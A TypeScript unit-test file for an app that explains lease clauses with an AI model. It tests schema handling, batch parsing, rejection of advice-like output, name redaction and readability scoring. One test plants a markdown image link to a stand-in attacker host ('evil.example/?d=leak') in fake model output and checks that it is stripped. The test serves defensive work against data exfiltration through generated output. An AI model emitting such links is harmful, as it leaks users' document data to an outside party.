import { describe, expect, it } from 'vitest';
import type { Clause } from '../domain/types.ts';
import { ingestPastedText } from '../ingest/index.ts';
import { ModelError } from '../model/errors.ts';
import type { JsonRequest, JsonResult, LlmPort, TextRequest } from '../model/port.ts';
import { NO_USAGE, parseWithSchema } from '../model/port.ts';
import { assertGeminiSafeSchema, toGeminiSchema } from '../model/schema.ts';
import { verifyQuote } from '../qa/verify.ts';
import { prepareForModel, type SafeDocument } from '../safety/index.ts';
import { segment } from '../segment/index.ts';
import { readability } from '../util/readability.ts';
import {
  aggregateReadability,
  ClauseExplanationSchema,
  ClauseExplanationsSchema,
  explainClauses,
  LeaseSummarySchema,
  parseBatch,
  SUMMARY_PARTS,
  SummarySectionSchema,
  summariseLease,
} from './explain.ts';

/**
 * The model pass, at the unit level: what the schemas promise the provider, what survives a batch
 * with a bad entry in it, and what happens to prose that crosses the advice line.
 */

const DOC = `1. RENT
   The Tenant shall pay rent of 1,200 each month, in advance, on the first day of the month.

2. NOTICE
   Either party may end this agreement by giving not less than thirty (30) days written notice.
`;

const RENT_CLAUSE: Clause = {
  id: 'c1',
  path: ['1'],
  headingTrail: [],
  heading: 'RENT',
  text: '1. RENT The Tenant shall pay rent of 1,200 each month, in advance.',
  charStart: 0,
  charEnd: 64,
  pageStart: 1,
  pageEnd: 1,
  level: 1,
};

const CLAUSES: readonly Clause[] = [RENT_CLAUSE];

/** `analyse()` never streams, so every fake refuses rather than pretending to. */
function unusedStream(): AsyncIterable<string> {
  return {
    [Symbol.asyncIterator](): AsyncIterator<string> {
      throw new Error('generateTextStream is not used by the explain pass');
    },
  };
}

function safeDoc(): SafeDocument {
  return prepareForModel(DOC);
}

function portReturning(value: unknown, task = 'explain-clauses'): LlmPort {
  return {
    label: 'fake',
    async generateJson<T>(request: JsonRequest<T>): Promise<JsonResult<T>> {
      if (request.task !== task) {
        throw new ModelError('NOT_CONFIGURED', 'no response', {
          retryable: false,
          userMessage: 'unavailable',
        });
      }
      return {
        value: parseWithSchema(JSON.stringify(value), request.schema),
        usage: NO_USAGE,
        repaired: false,
        model: 'fake',
      };
    },
    generateTextStream(_request: TextRequest): AsyncIterable<string> {
      return unusedStream();
    },
    countTokens: (): Promise<number> => Promise.resolve(0),
  };
}

describe('the schemas the provider is actually sent', () => {
  it('advertises the full item shape even though the wrapper accepts anything', () => {
    const { schema } = toGeminiSchema(ClauseExplanationsSchema);
    const json = JSON.stringify(schema);
    // The tolerance is ours, not the provider's: Gemini is still told exactly what to produce.
    expect(json).toContain('clauseId');
    expect(json).toContain('plainEnglish');
    expect(json).toContain('quote');
    expect(json).toContain('unusual');
    expect(json).not.toContain('minLength');
  });

  it('advertises a quote field on every summary section — a verifier cannot check what is absent', () => {
    const json = JSON.stringify(toGeminiSchema(LeaseSummarySchema).schema);
    expect(json).toContain('quote');
    expect(json).toContain('part');
    for (const part of SUMMARY_PARTS) expect(json).toContain(part);
  });

  it('carries no keyword Gemini would accept and silently ignore', () => {
    expect(() =>
      assertGeminiSafeSchema(toGeminiSchema(ClauseExplanationsSchema).schema),
    ).not.toThrow();
    expect(() => assertGeminiSafeSchema(toGeminiSchema(LeaseSummarySchema).schema)).not.toThrow();
  });

  it('accepts a batch containing an entry that would fail the item schema', () => {
    // This is the property the all-or-nothing wrapper did not have: the batch parses, and the
    // decision about the bad entry is ours to make one item at a time.
    const parsed = ClauseExplanationsSchema.safeParse({
      explanations: [{ clauseId: 'c1' }, 'nonsense', null],
    });
    expect(parsed.success).toBe(true);
  });
});

describe('parseBatch', () => {
  const good = {
    clauseId: 'c1',
    plainEnglish: 'This clause says the rent is due on the first day of each month.',
    quote: 'pay rent of 1,200 each month',
    unusual: false,
  };

  it('keeps the survivors and reports each failure separately', () => {
    const result = parseBatch(
      [good, { clauseId: 'c2', plainEnglish: 7 }, { ...good, clauseId: 'c3' }],
      ClauseExplanationSchema,
      'clauseId',
    );
    expect(result.kept.map((e) => e.clauseId)).toEqual(['c1', 'c3']);
    expect(result.rejected.length).toBe(1);
    expect(result.rejected[0]?.id).toBe('c2');
    expect(result.rejected[0]?.kind).toBe('invalid-shape');
    expect(result.rejected[0]?.reason).toMatch(/plainEnglish/);
  });

  it('does not invent an id for an entry that carried none', () => {
    const result = parseBatch(['junk', 42, null, {}], ClauseExplanationSchema, 'clauseId');
    expect(result.kept.length).toBe(0);
    expect(result.rejected.map((r) => r.id)).toEqual([null, null, null, null]);
  });

  it('enforces the constraints the provider ignores, such as a one-word explanation', () => {
    const result = parseBatch(
      [{ ...good, plainEnglish: 'Rent.' }],
      ClauseExplanationSchema,
      'clauseId',
    );
    expect(result.kept.length).toBe(0);
  });

  it('works for summary sections too, keyed on the part', () => {
    const result = parseBatch(
      [
        {
          part: 'money',
          text: 'The tenant pays rent of 1,200 each month in advance.',
          quote: 'pay rent of 1,200',
        },
        { part: 'not-a-part', text: 'x', quote: 'y' },
      ],
      SummarySectionSchema,
      'part',
    );
    expect(result.kept.length).toBe(1);
    expect(result.rejected[0]?.id).toBe('not-a-part');
  });
});

describe('explainClauses', () => {
  it('makes no call and reports "skipped" when nothing was escalated', async () => {
    const outcome = await explainClauses(portReturning({ explanations: [] }), safeDoc(), []);
    expect(outcome.outcome).toBe('skipped');
    expect(outcome.explanations).toEqual([]);
    expect(outcome.note).toBeNull();
  });

  it('reports "failed" — not a call — when the provider refuses', async () => {
    const port: LlmPort = {
      label: 'refusing',
      generateJson: (): Promise<never> =>
        Promise.reject(
          new ModelError('QUOTA_EXHAUSTED', 'daily quota exhausted', {
            retryable: false,
            userMessage: 'The daily AI quota is used up. The rule-based findings are unaffected.',
          }),
        ),
      generateTextStream: unusedStream,
      countTokens: (): Promise<number> => Promise.resolve(0),
    };

    const outcome = await explainClauses(port, safeDoc(), CLAUSES);
    expect(outcome.outcome).toBe('failed');
    expect(outcome.note).toMatch(/daily AI quota/i);
    expect(outcome.usage).toEqual(NO_USAGE);
  });

  it('withholds prose that tells the reader what to do, and says which entry', async () => {
    const port = portReturning({
      explanations: [
        {
          clauseId: 'c1',
          plainEnglish: 'You should refuse to sign this until the notice period is symmetrical.',
          quote: 'pay rent of 1,200 each month',
          unusual: true,
        },
      ],
    });

    const outcome = await explainClauses(port, safeDoc(), CLAUSES);
    expect(outcome.explanations.length).toBe(0);
    expect(outcome.rejected[0]?.kind).toBe('advice');
    expect(outcome.rejected[0]?.id).toBe('c1');
  });

  it('strips a link out of generated prose — the exfiltration channel, closed in production', async () => {
    const port = portReturning({
      explanations: [
        {
          clauseId: 'c1',
          plainEnglish: 'The rent is due monthly. ![](https://evil.example/?d=leak) See the table.',
          quote: 'pay rent of 1,200 each month',
          unusual: false,
        },
      ],
    });

    const outcome = await explainClauses(port, safeDoc(), CLAUSES);
    expect(outcome.explanations[0]?.plainEnglish).not.toContain('evil.example');
    expect(outcome.explanations[0]?.plainEnglish).toContain('image removed');
  });

  it('falls back to its own words when the failure is not a ModelError', async () => {
    const port: LlmPort = {
      label: 'broken',
      generateJson: (): Promise<never> => Promise.reject(new TypeError('fetch is not a function')),
      generateTextStream: unusedStream,
      countTokens: (): Promise<number> => Promise.resolve(0),
    };

    const explained = await explainClauses(port, safeDoc(), CLAUSES);
    expect(explained.note).toMatch(/findings below are unaffected/i);
    const summarised = await summariseLease(port, safeDoc());
    expect(summarised.note).toMatch(/summary could not be generated/i);
  });

  it('labels an unheaded clause by its number, and an unnumbered one honestly', async () => {
    let sent = '';
    const port: LlmPort = {
      label: 'capture',
      async generateJson<T>(request: JsonRequest<T>): Promise<JsonResult<T>> {
        sent = request.task_input;
        return {
          value: parseWithSchema('{"explanations":[]}', request.schema),
          usage: NO_USAGE,
          repaired: false,
          model: 'capture',
        };
      },
      generateTextStream: unusedStream,
      countTokens: (): Promise<number> => Promise.resolve(0),
    };

    await explainClauses(port, safeDoc(), [
      { ...RENT_CLAUSE, id: 'c2', heading: null, path: ['4', '1'] },
      { ...RENT_CLAUSE, id: 'c3', heading: null, path: [] },
    ]);

    expect(sent).toContain('[c2] 4.1');
    expect(sent).toContain('[c3] unheaded');
  });

  it('counts a returned batch as one completed call', async () => {
    const outcome = await explainClauses(
      portReturning({
        explanations: [
          {
            clauseId: 'c1',
            plainEnglish: 'This clause says the rent is due on the first day of each month.',
            quote: 'pay rent of 1,200 each month',
            unusual: false,
          },
        ],
      }),
      safeDoc(),
      CLAUSES,
    );
    expect(outcome.outcome).toBe('completed');
    expect(outcome.explanations.length).toBe(1);
  });
});

/**
 * The clause list travels in `task_input`, outside the document channel, so redacting the channel
 * alone is not enough. These call `explainClauses` with an unguarded port on purpose: they prove the
 * call site redacts on its own, and do not lean on the guard `analyse()` wraps around the port.
 */
describe('explainClauses sends redacted excerpts and still anchors to the original', () => {
  const PEOPLE = `1. PARTIES
   This agreement is made between Mr. Arvind Kulkarni ("the Landlord") and Ms. Meera Joshi ("the Tenant").

2. DEPOSIT
   Mr. Kulkarni shall refund the deposit of 50,000 to Ms. Joshi within thirty days of the tenancy ending.
`;
  const RAW_NAMES = /Arvind|Kulkarni|Meera|Joshi/;
  const segmented = segment(ingestPastedText(PEOPLE));

  /** A port that keeps the task input it was sent and answers with `reply(taskInput)`. */
  function capturing(reply: (taskInput: string) => unknown = () => ({ explanations: [] })): {
    readonly port: LlmPort;
    readonly sent: () => string;
  } {
    let taskInput = '';
    const port: LlmPort = {
      label: 'capture',
      async generateJson<T>(request: JsonRequest<T>): Promise<JsonResult<T>> {
        taskInput = request.task_input;
        return {
          value: parseWithSchema(JSON.stringify(reply(taskInput)), request.schema),
          usage: NO_USAGE,
          repaired: false,
          model: 'capture',
        };
      },
      generateTextStream: unusedStream,
      countTokens: (): Promise<number> => Promise.resolve(0),
    };
    return { port, sent: () => taskInput };
  }

  it('puts the stand-ins the channel uses in every excerpt, and no original name', async () => {
    const safe = prepareForModel(segmented.document.text);
    const { port, sent } = capturing();

    await explainClauses(port, safe, segmented.clauses);

    expect(sent()).not.toMatch(RAW_NAMES);
    // The same words the channel carries, so the model reads one cast of people in both places.
    const phrase = `Mr. ${safe.map.surrogateFor('Kulkarni')} shall refund the deposit of 50,000 to Ms. ${safe.map.surrogateFor('Joshi')}`;
    expect(sent()).toContain(phrase);
    expect(safe.channel).toContain(phrase);
  });

  it('redacts a clause heading as well as its body', async () => {
    const safe = prepareForModel(segmented.document.text);
    const { port, sent } = capturing();

    await explainClauses(port, safe, [
      { ...RENT_CLAUSE, heading: 'Signed by Mr. Arvind Kulkarni' },
    ]);

    expect(sent()).toContain(`[c1] Signed by Mr. ${safe.map.surrogateFor('Arvind Kulkarni')}`);
    expect(sent()).not.toMatch(RAW_NAMES);
  });

  it('redacts before truncating, so a name at the cut is never sent in part', async () => {
    const safe = prepareForModel(segmented.document.text);
    const { port, sent } = capturing();
    // No space near the 900-character limit, so the cut falls inside whatever word sits there.
    // Truncating first would send "Kulka", which no map can recognise as a name.
    const text = `Mr. Arvind Kulkarni signs. ${'-'.repeat(868)}Kulkarni`;

    await explainClauses(port, safe, [{ ...RENT_CLAUSE, text }]);

    expect(sent()).not.toMatch(/Kulka|Arvind/);
    expect(sent()).toContain(`${'-'.repeat(868)}${safe.map.surrogateFor('Kulkarni')}`);
  });

  it('restores a quote copied from an excerpt to the original words, which verify in place', async () => {
    const safe = prepareForModel(segmented.document.text);
    const stand = safe.map.surrogateFor('Kulkarni') ?? '';
    const { port } = capturing((taskInput) => {
      // The model can only copy what it was shown: the redacted excerpt.
      const excerpt = /\[c2\][^\n]*\n([^\n]+)/.exec(taskInput)?.[1] ?? '';
      return {
        explanations: [
          {
            clauseId: 'c2',
            plainEnglish: `Mr. ${stand} returns the deposit of 50,000 within thirty days of the tenancy ending.`,
            quote: excerpt.slice(excerpt.indexOf('Mr.'), excerpt.indexOf(' within')),
            unusual: false,
          },
        ],
      };
    });

    const outcome = await explainClauses(port, safe, segmented.clauses);
    const [explained] = outcome.explanations;

    expect(stand.length).toBeGreaterThan(0);
    expect(explained?.quote).toBe('Mr. Kulkarni shall refund the deposit of 50,000 to Ms. Joshi');
    expect(explained?.plainEnglish).toContain('Mr. Kulkarni returns the deposit');
    expect(explained?.plainEnglish).not.toContain(stand);

    const anchor = verifyQuote(segmented, { quote: explained?.quote ?? '', clauseId: 'c2' });
    expect('charStart' in anchor, 'the restored quote must verify').toBe(true);
    if (!('charStart' in anchor)) return;
    expect(segmented.document.text.slice(anchor.charStart, anchor.charEnd)).toBe(explained?.quote);
    expect(anchor.clauseId).toBe('c2');
  });
});

describe('summariseLease', () => {
  it('returns sections with their quotes, and reports a completed call', async () => {
    const outcome = await summariseLease(
      portReturning(
        {
          sections: [
            {
              part: 'money',
              text: 'The tenant pays 1,200 each month, in advance, on the first day.',
              quote: 'pay rent of 1,200 each month',
            },
          ],
        },
        'summarise-lease',
      ),
      safeDoc(),
    );

    expect(outcome.outcome).toBe('completed');
    expect(outcome.sections[0]?.part).toBe('money');
    expect(outcome.sections[0]?.quote).toBe('pay rent of 1,200 each month');
  });

  it('keeps the good parts of a summary when one part is malformed', async () => {
    const outcome = await summariseLease(
      portReturning(
        {
          sections: [
            {
              part: 'money',
              text: 'The tenant pays 1,200 each month, in advance.',
              quote: 'pay rent of 1,200',
            },
            { part: 'timing', text: 'too short' },
          ],
        },
        'summarise-lease',
      ),
      safeDoc(),
    );

    expect(outcome.sections.length).toBe(1);
    expect(outcome.rejected[0]?.id).toBe('timing');
  });

  it('reports "failed" rather than an exception when the provider is unreachable', async () => {
    const outcome = await summariseLease(portReturning({ sections: [] }, 'other-task'), safeDoc());
    expect(outcome.outcome).toBe('failed');
    expect(outcome.sections).toEqual([]);
    expect(outcome.note).toBe('unavailable');
  });
});

describe('the prompts state the reading level they ask for', () => {
  /** Records the request and answers with an empty batch of the right shape. */
  function recording(requests: JsonRequest<unknown>[]): LlmPort {
    return {
      label: 'recording',
      async generateJson<T>(request: JsonRequest<T>): Promise<JsonResult<T>> {
        requests.push(request as JsonRequest<unknown>);
        const empty = request.task === 'explain-clauses' ? { explanations: [] } : { sections: [] };
        return {
          value: parseWithSchema(JSON.stringify(empty), request.schema),
          usage: NO_USAGE,
          repaired: false,
          model: 'recording',
        };
      },
      generateTextStream: unusedStream,
      countTokens: (): Promise<number> => Promise.resolve(0),
    };
  }

  it('asks for an eighth-grade level in both the explanation and the summary pass', async () => {
    // Plan 06 measures the output against grade 8; a prompt that stopped asking for it would make
    // the measurement a surprise rather than a check.
    const requests: JsonRequest<unknown>[] = [];
    const port = recording(requests);
    await explainClauses(port, safeDoc(), CLAUSES);
    await summariseLease(port, safeDoc());

    expect(requests.map((request) => request.task)).toEqual(['explain-clauses', 'summarise-lease']);
    for (const request of requests) {
      expect(request.task_input).toMatch(/eighth-grade reading level/);
    }
  });
});

describe('aggregateReadability', () => {
  const EASY = 'The tenant pays rent each month. The rent is due on the first day.';
  const HARD =
    'Notwithstanding the foregoing, the licensee shall indemnify the licensor against consequential liabilities arising contemporaneously.';

  it('reports nothing measured as null, not as a perfect grade of zero', () => {
    expect(aggregateReadability([])).toEqual({
      passages: 0,
      meanGrade: null,
      maxGrade: null,
      meanReadingEase: null,
      minReadingEase: null,
    });
  });

  it('uses the util formulas unchanged for a single passage', () => {
    const score = readability(EASY);
    expect(aggregateReadability([EASY])).toEqual({
      passages: 1,
      meanGrade: score.gradeLevel,
      maxGrade: score.gradeLevel,
      meanReadingEase: score.readingEase,
      minReadingEase: score.readingEase,
    });
  });

  it('keeps the hardest passage visible — a mean alone would hide it', () => {
    const easy = readability(EASY);
    const hard = readability(HARD);
    const aggregate = aggregateReadability([EASY, HARD]);

    expect(aggregate.passages).toBe(2);
    expect(aggregate.maxGrade).toBe(hard.gradeLevel);
    expect(aggregate.minReadingEase).toBe(hard.readingEase);
    expect(aggregate.meanGrade).toBeCloseTo((easy.gradeLevel + hard.gradeLevel) / 2, 2);
    expect(aggregate.meanReadingEase).toBeCloseTo((easy.readingEase + hard.readingEase) / 2, 2);
    expect(aggregate.maxGrade ?? 0).toBeGreaterThan(aggregate.meanGrade ?? 0);
  });

  it('rounds its means to two places, like the scores it averages', () => {
    const { meanGrade, meanReadingEase } = aggregateReadability([EASY, HARD, EASY]);
    const twoPlaces = (n: number | null): number => Math.round((n ?? Number.NaN) * 100) / 100;
    expect(meanGrade).toBe(twoPlaces(meanGrade));
    expect(meanReadingEase).toBe(twoPlaces(meanReadingEase));
  });
});
